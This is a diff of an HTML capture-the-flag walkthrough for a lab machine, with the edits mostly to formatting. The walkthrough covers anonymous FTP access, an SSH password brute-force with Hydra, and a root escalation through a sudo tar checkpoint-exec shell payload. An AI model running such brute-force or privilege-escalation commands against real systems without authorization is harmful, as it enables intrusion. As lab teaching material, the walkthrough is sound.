@@ -40,7 +40,7 @@
 
     <h3>Results:</h3>
     <pre>
-        ┌──(root㉿rex)-[/home/rexadmin]
+┌──(root㉿rex)-[/home/rexadmin]
 └─# nmap -A 10.10.253.164
 Starting Nmap 7.94SVN ( [https://nmap.org](https://nmap.org/) ) at 2024-02-09 21:19 IST
 Nmap scan report for 10.10.253.164
@@ -88,9 +88,8 @@ Nmap done: 1 IP address (1 host up) scanned in 70.23 seconds
 
     <h2>Step 2: Start Enumeration with FTP</h2>
     <pre>
-        ┌──(root㉿rex)-[/home/rexadmin/ctf]
-        └─# ftp 10.10.253.164
-
+ ┌──(root㉿rex)-[/home/rexadmin/ctf]
+ └─# ftp 10.10.253.164
 Connected to 10.10.253.164.
 220 (vsFTPd 3.0.3)
 Name (10.10.253.164:rexadmin): anonymous
@@ -98,7 +97,7 @@ Name (10.10.253.164:rexadmin): anonymous
 Remote system type is UNIX.
 Using binary mode to transfer files.
 
-<h3>You get in. Voila!</h3>
+<h2>You are in!</h2>
 
 ftp> ls
 200 EPRT command successful. Consider using EPSV.
@@ -107,7 +106,7 @@ ftp> ls
 -rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
 226 Directory send OK.
 
-<h3>We can see two files in pwd. And, we have to see what is on’em.</h3>
+<h2>We can see two files in pwd. And, we have to see what is on’em.</h2>
         
 ftp> get task.txt
 local: task.txt remote: task.txt
@@ -129,18 +128,19 @@ local: locks.txt remote: locks.txt
 
 **Both files** task.txt and locks.txt downloaded! 
 
-    Now, task.txt and you get the flag for Q3. And, save both of these files, they might be used later.</pre>
+ <h2>Now, cat task.txt and you will get the flag for Q3. 
+And, save both of these files, they can be or might be be used later, who knows.</pre>
     
       <h2>Step 3:Next Flag</h2>
         <pre>
-     <p>Now, you have to answer the Q4: **What service can you bruteforce with the text file found?**
+     <h2>Now, you have to answer the Q4: **What service can you bruteforce with the text file found?**</h2>
 
-This question has two answers, as we can try to brute force the FTP server, it responds with the wrong answer. 
-Then the second one is SSH. And, yeah, you got it!
-Now, you are almost done the half of the room! BRAVO! You can become an elite hacker in the future, just carry on and be persistent.</p> 
-        </pre>
+<p>This question has two answers, as we can try to brute force the FTP server, well, seems like no use. 
+Then the second one is SSH. And, we got our guy!
+Now, you are almost done the half of the room! 
+You can become an elite hacker in the future, just carry on and be persistent.</p></pre>
   
-    <h2>Step 4: Brute Forcing SSH</h2>
+<h2>Step 4: Brute Forcing SSH</h2>
     <pre>   
  <p> Do you know what is the users password?
 
@@ -153,22 +153,22 @@ What we have right now is:
 
 Now, to find the password of the users, you can use a password brute-forcer like Hydra. </p>
 
-Command: <p> hydra -l lin -P locks.txt 10.10.253.164 ssh  </p>
+#Command: <p> hydra -l lin -P locks.txt 10.10.253.164 ssh  </p>
 
 <h4>Command Description:</h4> 
 
 Here's a breakdown of the command:
 <pre>
-- **`hydra`**: invokes the Hydra password-cracking tool
-- **-l `lin`**: specifies the username to use for the attack
-- **-P `locks.txt`**: specifies the file containing a list of passwords to try
-- **`10.10.253.164`**: specifies the IP address of the SSH server to attack
-- **`ssh`**: specifies the protocol to use for the attack (in this case, SSH)
+- hydra: invokes the Hydra password-cracking tool
+- -l lin: specifies the username to use for the attack
+- -P locks.txt: specifies the file containing a list of passwords to try
+- 10.10.253.164: specifies the IP address of the SSH server to attack
+- ssh: specifies the protocol to use for the attack (in this case, SSH)
 </pre>
-<p>Now, hit that command! </p>
-       
- <pre>┌──(root㉿rex)-[/home/rexadmin/ctf]
-      └─# hydra -l lin -P locks.txt 10.10.253.164 ssh
+<h4>Now, hit that command!</h4> </p>
+ <pre>
+┌──(root㉿rex)-[/home/rexadmin/ctf]
+└─# hydra -l lin -P locks.txt 10.10.253.164 ssh
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-02-09 23:36:06
@@ -181,10 +181,10 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-02-09 23:36:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-02-09 23:36:14
        </pre>
 
-<p>Now, we have a user and his password. Let’s now try to ssh via these credentials.</p>
+<p>#Now, we have a user and his password. Let’s now try to ssh via these credentials.</p>
         <pre>
 ┌──(root㉿rex)-[/home/rexadmin/ctf]
-└─# ssh [lin@10.10.253.164](mailto:lin@10.10.253.164)
+└─# ssh lin@10.10.253.164
 
 The authenticity of host '10.10.253.164 (10.10.253.164)' can't be established.
 ED25519 key fingerprint is SHA256:Y140oz+ukdhfyG8/c5KvqKdvm+Kl+gLSvokSys7SgPU.
@@ -204,23 +204,28 @@ Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)
 Last login: Sun Jun  7 22:23:41 2020 from 192.168.0.14
 lin@bountyhacker:~/Desktop$ ls
 user.txt</pre>  
-<p>BRAVO! You are an elite HACKER! You just got the user.txt flag. 
+<h1>BRAVO! You just got the user flag. Now, you officialy became a HACKER! </h1>
 
 Wait, but actually, we are looking for the users password, right?
 Let’s think about where can be the additional users other than lin…..
 Wait, we just did FTP till now, let’s look for other ports: its HTTP 80.
 But it looks like just a conversation between these guys, they can be the users. 
 
-Lets create a users.txt file and add all the names on it using nano text editor. </p>
+Lets create a users.txt file and add all the names on it using nano. </p>
         
-<pre>┌──(root㉿rex)-[/home/rexadmin/ctf]
-     └─# nano users.txt
+<pre>
+┌──(root㉿rex)-[/home/rexadmin/ctf]
+└─# nano users.txt
+
+
 
 #Add all those names you find on the webpage.
 
-     ┌──(root㉿rex)-[/home/rexadmin/ctf]
-     └─# ls
+┌──(root㉿rex)-[/home/rexadmin/ctf]
+└─# ls
 locks.txt  rockyou.txt  task.txt  users.txt
+
+
 
 ┌──(root㉿rex)-[/home/rexadmin/ctf]
 └─# cat users.txt
@@ -231,10 +236,10 @@ Edward
 Ein
 Faye
 </pre>
-<h2>Step 5: Escalating Privileges</h2>
+<h1>Step 5: Escalating Privileges</h1>
 <pre> Now, you have to brute force again using Hydra via ssh, because that is all that we’ve got.
 
-Command: hydra ssh://10.10.253.164 -L users.txt -P locks.txt
+#Command: hydra ssh://10.10.253.164 -L users.txt -P locks.txt
         
 ┌──(root㉿rex)-[/home/rexadmin/ctf]
 └─# hydra ssh://10.10.253.164 -L users.txt -P locks.txt
@@ -294,9 +299,10 @@ secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/
 User lin may run the following commands on bountyhacker:
 (root) /bin/tar</pre>
 
-      <p> As you can see, we can execute tar as root.
-        Now, without wasting any time, let’s get into <a href="https://gtfobins.github.io/" target="_blank">GTFOBins</a> and search for tar.
-        After you get into that binary page, navigate to a subsection for SUDO.
+      <p>
+As you can see, we can execute tar as root.
+Now, without wasting any time, let’s get into <a href="https://gtfobins.github.io/" target="_blank">GTFOBins</a> and search for tar.
+After you get into that webpage, navigate to a sub-section for SUDO.
 
         You will find something like this:</p>
 
@@ -304,17 +310,20 @@ User lin may run the following commands on bountyhacker:
 
         <code>sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh</code>
 
-        Now, execute that command payload.
+        Now, execute this payload.
 
-        <pre>#lin@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
-              tar: Removing leading `/' from member names</pre>
+        <pre>
+lin@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+tar: Removing leading `/' from member names</pre>
 
 
         <p>Now, check who you are by running <code>whoami</code>.</p>
         
 
-        <pre>#whoami
-        <code>root</code></pre>
+        <pre>
+lin@bountyhacker:~/Desktop$whoami
+        <code>
+root</code></pre>
 
         <pre>$$$ BRAVO! You are now root.
 
@@ -324,7 +333,10 @@ User lin may run the following commands on bountyhacker:
   <pre> #locate root.txt
         <code>/root/root.txt</code>
         #cat /root/root.txt
-        <code>XxXxXxXxXxXxXx</code></pre>
+       
+
+
+ <code>XxXxXxXxXxXxXx</code></pre>
 
        <H1> Felicitaciones! You did it! </H1>
 </body>
